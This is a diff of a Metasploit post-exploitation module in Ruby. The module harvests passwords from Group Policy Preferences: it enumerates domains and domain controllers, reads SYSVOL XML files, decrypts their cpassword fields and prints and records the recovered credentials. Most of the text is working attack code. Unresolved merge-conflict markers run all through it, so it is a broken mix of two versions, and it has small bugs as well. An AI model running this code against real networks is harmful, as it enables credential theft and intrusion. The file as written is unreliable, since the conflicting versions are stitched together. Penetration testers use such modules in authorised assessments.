@@ -8,10 +8,18 @@
 require 'msf/core'
 require 'rex'
 require 'rexml/document'
+<<<<<<< HEAD
+=======
+require 'msf/core/post/windows/registry'
+>>>>>>> upstream/master
 
 class Metasploit3 < Msf::Post
 	include Msf::Auxiliary::Report
 	include Msf::Post::Windows::Priv
+<<<<<<< HEAD
+=======
+	include Msf::Post::Windows::Registry
+>>>>>>> upstream/master
 
 	def initialize(info={})
 		super( update_info( info,
@@ -22,6 +30,7 @@ class Metasploit3 < Msf::Post
 				files containing local user accounts and passwords and decrypts them
 				using Microsofts public AES key.
 
+<<<<<<< HEAD
 				Users can specify DOMAINS="domain1 domain2 domain3 etc" to target specific
 				domains on the network. This module will enumerate any domain controllers for
 				those domains.
@@ -35,13 +44,21 @@ class Metasploit3 < Msf::Post
 				Using the ALL or DOMAINS flags whilst on a DC will not enumerate that DC as it
 				is looking externally on the network for other Domain Controllers, however the
 				default (CURRENT=True which inspects the registry) should work successfully.
+=======
+				Tested on WinXP SP3 Client and Win2k8 R2 DC.
+>>>>>>> upstream/master
 			},
 			'License'       => MSF_LICENSE,
 			'Author'        =>[
 				'Ben Campbell <eat_meatballs[at]hotmail.co.uk>',
 				'Loic Jaquemet <loic.jaquemet+msf[at]gmail.com>',
 				'scriptmonkey <scriptmonkey[at]owobble.co.uk>',
+<<<<<<< HEAD
 				'TheLightCosine <thelightcosine[at]gmail.com>'
+=======
+				'TheLightCosine <thelightcosine[at]metasploit.com>',
+				'Rob Fuller <mubix[at]hak5.org>' #domain/dc enumeration code
+>>>>>>> upstream/master
 				],
 			'References'    =>
 				[
@@ -54,6 +71,7 @@ class Metasploit3 < Msf::Post
 			'SessionTypes'  => [ 'meterpreter' ]
 		))
 
+<<<<<<< HEAD
 		register_options(
 			[
 				OptBool.new('CURRENT', [ false, 'Enumerate current machine domain.', true]),
@@ -190,6 +208,113 @@ class Metasploit3 < Msf::Post
 		end
 	end
 
+=======
+		register_options([
+			OptBool.new('ALL', [ false, 'Enumerate all domains on network.', true]),
+			OptString.new('DOMAINS', [false, 'Enumerate list of space seperated domains DOMAINS="dom1 dom2".'])], self.class)
+	end
+
+	def run
+
+		group_path = "MACHINE\\Preferences\\Groups\\Groups.xml"
+		group_path_user = "USER\\Preferences\\Groups\\Groups.xml"
+		service_path = "MACHINE\\Preferences\\Services\\Services.xml"
+		printer_path = "USER\\Preferences\\Printers\\Printers.xml"
+		drive_path = "USER\\Preferences\\Drives\\Drives.xml"
+		datasource_path = "MACHINE\\Preferences\\Datasources\\DataSources.xml"
+		datasource_path_user = "USER\\Preferences\\Datasources\\DataSources.xml"
+		task_path = "MACHINE\\Preferences\\ScheduledTasks\\ScheduledTasks.xml"
+		task_path_user = "USER\\Preferences\\ScheduledTasks\\ScheduledTasks.xml"
+
+		domains = []
+		dcs = []
+		basepaths = []
+		fullpaths = []
+		@enumed_domains = []
+
+		print_status "Checking locally.."
+		locals = get_basepaths(client.fs.file.expand_path("%SYSTEMROOT%\\SYSVOL\\sysvol"))
+		unless locals.blank?
+			basepaths << locals
+			print_good "Policy Sahres found locally"
+		end
+
+		if datastore['ALL'] and datastore['DOMAINS'].blank?
+			domains = enum_domains
+			domains.reject!{|n| n == "WORKGROUP"}
+		end
+
+		datastore['DOMAINS'].split('').each{|ud| domains << ud} if datastore['DOMAINS']
+		domains << get_domain_reg
+		domains.flatten!
+		domains.compact!
+		domains.uniq!
+
+
+		domains.each do |domain|
+			dcs = enum_dcs(domain)
+			next if dcs.blank?
+			dcs.uniq!
+			tbase = []
+			dcs.each do |dc|
+				print_status "Searching for Policy Share on #{dc}..."
+				tbase = get_basepaths("\\\\#{dc}\\SYSVOL")
+				#If we got a basepath from the DC we know that we can reach it
+				#All DCs on the same domain should be the same so we only need one
+				unless tbase.blank?
+					print_good "Found Policy Share on #{dc}"
+					basepaths << tbase
+					break
+				end
+			end
+		end
+
+		basepaths.flatten!
+		basepaths.compact!
+		print_status "Searching for Group Policy XML Files..."
+		basepaths.each do |policy_path|
+			fullpaths << find_path(policy_path, group_path)
+			fullpaths << find_path(policy_path, group_path_user)
+			fullpaths << find_path(policy_path, service_path)
+			fullpaths << find_path(policy_path, printer_path)
+			fullpaths << find_path(policy_path, drive_path)
+			fullpaths << find_path(policy_path, datasource_path)
+			fullpaths << find_path(policy_path, datasource_path_user)
+			fullpaths << find_path(policy_path, task_path)
+			fullpaths << find_path(policy_path, task_path_user)
+		end
+		fullpaths.flatten!
+		fullpaths.compact!
+		fullpaths.each do |filepath|
+			tmpfile = gpp_xml_file(filepath)
+			parse_xml(tmpfile) if tmpfile
+		end
+
+	end
+
+	def get_basepaths(base)
+		locals = []
+		begin
+			session.fs.dir.foreach(base) do |sub|
+				next if sub =~ /^(\.|\.\.)$/
+				tpath = "#{base}\\#{sub}\\Policies"
+				begin
+					session.fs.dir.foreach(tpath) do |sub2|
+						next if sub =~ /^(\.|\.\.)$/
+						locals << "#{tpath}\\#{sub2}\\"
+					end
+				rescue Rex::Post::Meterpreter::RequestError => e
+					print_error "Could not access #{tpath}  : #{e.message}"
+				end
+			end
+		rescue Rex::Post::Meterpreter::RequestError => e
+			print_error "Error accessing #{base} : #{e.message}"
+		end
+		return locals
+	end
+
+
+>>>>>>> upstream/master
 	def find_path(path, xml_path)
 		xml_path = "#{path}\\#{xml_path}"
 		begin
@@ -200,13 +325,18 @@ class Metasploit3 < Msf::Post
 		end
 	end
 
+<<<<<<< HEAD
 	def get_xml(path)
+=======
+	def gpp_xml_file(path)
+>>>>>>> upstream/master
 		begin
 			groups = client.fs.file.new(path,'r')
 			until groups.eof
 				data = groups.read
 			end
 
+<<<<<<< HEAD
 			domain = path.split('\\')[2]
 
 			mxml = REXML::Document.new(data).root
@@ -334,6 +464,75 @@ class Metasploit3 < Msf::Post
 		end
 	end
 
+=======
+			spath = path.split('\\')
+			retobj = {
+				:dc     => spath[2],
+				:path   => path,
+				:xml    => REXML::Document.new(data).root
+			}
+			if spath[4] == "sysvol"
+				retobj[:domain] = spath[5]
+			else
+				retobj[:domain] = spath[4]
+			end
+			return retobj
+		rescue Rex::Post::Meterpreter::RequestError => e
+			print_error "Received error code #{e.code} when reading #{path}"
+			return nil
+		end
+	end
+
+	def parse_xml(xmlfile)
+		mxml = xmlfile[:xml]
+		print_status "Parsing file: #{xmlfile[:path]} ..."
+		mxml.elements.to_a("//Properties").each do |node|
+			epassword = node.attributes['cpassword']
+			next if epassword.to_s.empty?
+			next if @enumed_domains.include? xmlfile[:domain]
+			@enumed_domains << xmlfile[:domain]
+			pass = decrypt(epassword)
+
+			user = node.attributes['runAs'] if node.attributes['runAs']
+			user = node.attributes['accountName'] if node.attributes['accountName']
+			user = node.attributes['username'] if  node.attributes['username']
+			user = node.attributes['userName'] if  node.attributes['userName']
+			user = node.attributes['newName'] unless  node.attributes['newName'].blank?
+			changed = node.parent.attributes['changed']
+
+			expires = node.attributes['expires']
+			never_expires = node.attributes['neverExpires']
+			disabled = node.attributes['acctDisabled']
+
+
+			table = Rex::Ui::Text::Table.new(
+				'Header'     => 'Group Policy Credential Info',
+				'Indent'     => 1,
+				'SortIndex'  => 5,
+				'Columns'    =>
+				[
+					'Name',
+					'Value',
+				]
+			)
+
+			table << ["USERNAME", user ]
+			table << ["PASSWORD", pass]
+			table << ["DOMAIN CONTROLLER", xmlfile[:dc]]
+			table << ["DOMAIN", xmlfile[:domain] ]
+			table << ["CHANGED", changed]
+			table << ["EXPIRES", expires] unless expires.blank?
+			table << ["NEVER_EXPIRES?", never_expires] unless never_expires.blank?
+			table << ["DISABLED", disabled] unless disabled.blank?
+
+
+			print_good table.to_s
+			report_creds(user,pass) unless disabled and disabled == '1'
+		end
+	end
+
+
+>>>>>>> upstream/master
 	def report_creds(user, pass)
 		if session.db_record
 			source_id = session.db_record.id
@@ -368,7 +567,11 @@ class Metasploit3 < Msf::Post
 		return pass
 	end
 
+<<<<<<< HEAD
 	#enum_domains.rb
+=======
+
+>>>>>>> upstream/master
 	def enum_domains
 		print_status "Enumerating Domains on the Network..."
 		domain_enum = 0x80000000 # SV_TYPE_DOMAIN_ENUM
@@ -405,14 +608,21 @@ class Metasploit3 < Msf::Post
 				x[:platform] = mem[(base + 0),4].unpack("V*")[0]
 				nameptr = mem[(base + 4),4].unpack("V*")[0]
 				x[:domain] = client.railgun.memread(nameptr,255).split("\0\0")[0].split("\0").join
+<<<<<<< HEAD
 				domains << x
+=======
+				domains << x[:domain]
+>>>>>>> upstream/master
 				base = base + 8
 		end
 
 		return domains
 	end
 
+<<<<<<< HEAD
 	#enum_domains.rb
+=======
+>>>>>>> upstream/master
 	def enum_dcs(domain)
 		print_status("Enumerating DCs for #{domain}")
 		domaincontrollers = 24  # 10 + 8 (SV_TYPE_DOMAIN_BAKCTRL || SV_TYPE_DOMAIN_CTRL)
@@ -423,7 +633,11 @@ class Metasploit3 < Msf::Post
 			result = client.railgun.netapi32.NetServerEnum(nil,100,4,buffersize,4,4,domaincontrollers,domain,nil)
 		end
 		if result['totalentries'] == 0
+<<<<<<< HEAD
 			print_error "No Domain Controllers found for #{domain}"
+=======
+			print_error("No Domain Controllers found for #{domain}")
+>>>>>>> upstream/master
 			return nil
 		end
 
@@ -433,7 +647,11 @@ class Metasploit3 < Msf::Post
 		base = 0
 		mem = client.railgun.memread(startmem, 8*count)
 		hostnames = []
+<<<<<<< HEAD
 		count.times do |i|
+=======
+		count.times{|i|
+>>>>>>> upstream/master
 			t = {}
 			t[:platform] = mem[(base + 0),4].unpack("V*")[0]
 			nameptr = mem[(base + 4),4].unpack("V*")[0]
@@ -441,6 +659,7 @@ class Metasploit3 < Msf::Post
 			base = base + 8
 			print_good "DC Found: #{t[:dc_hostname]}"
 			hostnames << t[:dc_hostname]
+<<<<<<< HEAD
 		end
 
 		return hostnames
@@ -482,3 +701,24 @@ class Metasploit3 < Msf::Post
 	end
 end
 
+=======
+		}
+		return hostnames
+	end
+
+	def get_domain_reg
+		begin
+			subkey = "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters\\"
+			v_name = "Domain"
+			domain = registry_getvaldata(subkey, v_name)
+			print_status "Retrieved domain #{domain} from registry "
+		rescue Rex::Post::Meterpreter::RequestError => e
+			print_error "Received error code #{e.code} - #{e.message} when reading the registry."
+		end
+		domain = domain.split('.')[0].upcase
+
+		return domain
+	end
+
+end
+>>>>>>> upstream/master
